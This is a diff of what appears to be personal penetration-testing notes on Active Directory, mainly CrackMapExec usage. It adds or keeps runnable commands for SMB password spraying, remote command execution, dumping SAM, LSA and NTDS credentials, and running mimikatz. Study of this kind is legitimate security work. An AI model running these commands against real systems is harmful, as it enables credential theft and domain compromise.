@@ -538,7 +538,7 @@ POST-Enumeration:
 							$prop
 						}
 						Write-Host "------------------------"
-						}					
+					}					
 				Explanation of script:
 					$domainObj contains output of:
 						[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() => this gives domain_name, name of dc
@@ -576,6 +576,8 @@ POST-Enumeration:
 				Explanation of script:
 					For the left out explanation, read Explanation for Script to enumerate all users
 					The filter attribute helps to filter the output to just contain groups
+			Script to enumerate nested groups:
+				Nested Groups are those which contains groups inside them along with users
 	If we have Pass/Hash:
 		GetADUsers.py:
 			User Enumeration
@@ -908,13 +910,18 @@ Crackmapexec:
 	Note:
 		crackmapexec allows ipv6:
 			dont use ip, instead use domain_name
+	password spraying:
+		crackmapexec smb ip -u user.txt -p 'Pass' --continue-on-success
+		crackmapexec smb ip -u username -p pass.txt --continue-on-success
+		crackmapexec smb ip -u user.txt -p pass.txt --continue-on-success
+		Crackmapexec smb targets.txt -u user.txt -p pass.txt --continue-on-success
 	To check the password/hash:
 		crackmapexec smb domain.local -u 'username' -p 'pass' #ptp
 		crackmapexec smb domain.local -u 'username' -H hash #pth
 	remote code execution:
-		crackmapexec smb ip -u 'user' -p 'pass' -x 'command`'
+		crackmapexec smb ip -u 'user' -p 'pass' -x 'command'
 		execution methods:
-			crackmapexec smb ip -u 'user' -p 'pass' -x 'command' --exec-method atexec => it executes command using Task Scheduler service
+			--exec-method atexec => it executes command using Task Scheduler service
 			--exec-method wmiexec => executes using WMI service
 	enumeration:
 		Crackmapexec smb ip -u 'username' -p 'pass' --users => users
@@ -922,19 +929,11 @@ Crackmapexec:
 		Crackmapexec smb ip -u 'username' -p 'pass' --shares => shares
 		--pass-pol => password policy
 		--disks => disk drives
-	bruteforcing:
-		username and password bruteforcing:
-			crackmapexec smb ip -u user.txt -p pass.txt
-	password spraying:
-		using a password against many users
-		crackmapexec smb ip -u user.txt -p 'Pass' --rid-brute
-		crackmapexec smb ip -u user.txt -p 'Pass' --continue-on-success
-	credential dumping:
-		Crackmapexec smb ip -u 'username' -p 'pass' --sam => sam file
+		--sam => sam file
 		--lsa => lsa file(LSA => Local Security Authority)
 		--ntds drsuapi => ntds file
 		--ntds vss => another way to dump ntds file
 	Modules:
 		crackmapexec smb -L => list all modules
-		mimikitaz:
+		mimikatz:
 			crackmapexec smb ip -u 'user' -p 'pass' -M mimikatz -o COMMAND='privilege::debug'
